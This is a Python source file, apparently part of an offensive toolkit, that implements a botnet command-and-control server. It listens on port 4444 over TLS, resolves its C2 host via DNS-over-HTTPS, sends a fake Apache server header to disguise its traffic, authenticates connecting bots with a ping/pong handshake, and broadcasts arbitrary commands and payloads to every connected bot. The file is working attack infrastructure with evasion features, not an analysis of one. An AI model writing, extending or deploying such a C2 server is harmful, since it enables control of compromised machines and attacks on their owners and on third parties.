
import socket
import threading
import json
import ssl
import os
from core.logger import log
from core.doh_utils import resolve_doh
from config import settings
from core.c2_profiles import PROFILES as C2_PROFILES


class BotHandler(threading.Thread):
    def __init__(self, conn, addr, botnet_manager):
        super().__init__()
        self.conn = conn
        self.addr = addr
        self.botnet_manager = botnet_manager
        self.bot_id = f"{self.addr[0]}:{self.addr[1]}"
        self.profile = self.botnet_manager.profile

    def run(self):
        log.info(f"Handling new bot connection from {self.bot_id}")
        try:
            # Send a fake server header
            server_header = self.profile.get("server_header", "Apache")
            self.conn.sendall(
                f"HTTP/1.1 200 OK\r\nServer: {server_header}\r\n\r\n".encode('utf-8'))

            # Authentication handshake
            self.conn.sendall(b'{"command": "ping"}\n')
            response = self.conn.recv(1024)
            if not response or b'pong' not in response:
                log.warning(
                    f"Bot {self.bot_id} failed authentication handshake. Closing connection.")
                return

            log.success(f"Bot {self.bot_id} authenticated successfully.")
            with self.botnet_manager.lock:
                self.botnet_manager.bots[self.bot_id] = {
                    "socket": self.conn, "status": "authenticated"}

            while self.botnet_manager.running:
                data = self.conn.recv(1024)
                if not data:
                    break
        except (ConnectionResetError, BrokenPipeError, ssl.SSLError) as e:
            log.warning(f"Bot {self.bot_id} connection error: {e}")
        finally:
            log.warning(f"Bot {self.bot_id} disconnected.")
            with self.botnet_manager.lock:
                if self.bot_id in self.botnet_manager.bots:
                    del self.botnet_manager.bots[self.bot_id]
            self.conn.close()


class BotnetManager:
    def __init__(self, port=4444, profile="default"):
        self.port = port
        self.bots = {}
        self.server_socket = None
        self.running = False
        self.lock = threading.Lock()
        self.cert_file = "c2_cert.pem"
        self.key_file = "c2_key.pem"
        self.profile = C2_PROFILES.get(profile, C2_PROFILES["default"])

    async def start_server(self):
        if self.running:
            log.warning("BotnetManager server is already running.")
            return

        if not (os.path.exists(self.cert_file) and os.path.exists(self.key_file)):
            log.critical(
                f"SSL cert or key not found. Please generate {self.cert_file} and {self.key_file}.")
            return

        c2_host_ip = await resolve_doh(settings.C2_HOST)
        if not c2_host_ip:
            log.critical(f"Could not resolve C2 host: {settings.C2_HOST}")
            return

        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)

        unsecure_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        unsecure_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        unsecure_socket.bind(("0.0.0.0", self.port))
        unsecure_socket.listen(10)

        self.server_socket = context.wrap_socket(
            unsecure_socket, server_side=True)
        self.running = True

        log.success(
            f"Botnet C2 server started securely on {c2_host_ip}:{self.port} with profile '{self.profile.get('user_agent')}'")

        self.listener_thread = threading.Thread(target=self._accept_bots)
        self.listener_thread.daemon = True
        self.listener_thread.start()

    def _accept_bots(self):
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                bot_thread = BotHandler(conn, addr, self)
                bot_thread.daemon = True
                bot_thread.start()
            except OSError:
                break
            except Exception as e:
                if self.running:
                    log.error(f"Error accepting bot connection: {e}")

    def stop_server(self):
        if not self.running:
            return

        self.running = False
        with self.lock:
            for bot_id, bot_info in self.bots.items():
                try:
                    bot_info["socket"].close()
                except Exception as e:
                    log.error(f"Error closing socket for bot {bot_id}: {e}")
            self.bots.clear()

        if self.server_socket:
            self.server_socket.close()

        log.info("Botnet C2 server stopped.")

    def list_bots(self):
        with self.lock:
            return list(self.bots.keys())

    def broadcast_command(self, command: str, payload: str = "") -> dict:
        if not self.running:
            log.error("Cannot broadcast command, server is not running.")
            return {"status": "error", "message": "Server not running."}

        full_command = {"command": command, "payload": payload}
        command_json = json.dumps(full_command)
        responses = {}
        bots_to_remove = []

        with self.lock:
            if not self.bots:
                log.warning("No bots connected to broadcast command to.")
                return {"status": "warning", "message": "No bots connected."}

            log.info(
                f"Broadcasting command '{command}' to {len(self.bots)} bot(s)...")
            for bot_id, bot_info in self.bots.items():
                try:
                    bot_info["socket"].sendall(command_json.encode('utf-8'))
                    responses[bot_id] = {"status": "sent"}
                except (ConnectionResetError, BrokenPipeError) as e:
                    log.warning(
                        f"Bot {bot_id} disconnected. Marking for removal.")
                    bots_to_remove.append(bot_id)
                except Exception as e:
                    log.error(f"Failed to send command to bot {bot_id}: {e}")
                    responses[bot_id] = {"status": "error", "message": str(e)}

        if bots_to_remove:
            with self.lock:
                for bot_id in bots_to_remove:
                    if bot_id in self.bots:
                        del self.bots[bot_id]

        return {"status": "success", "results": responses}
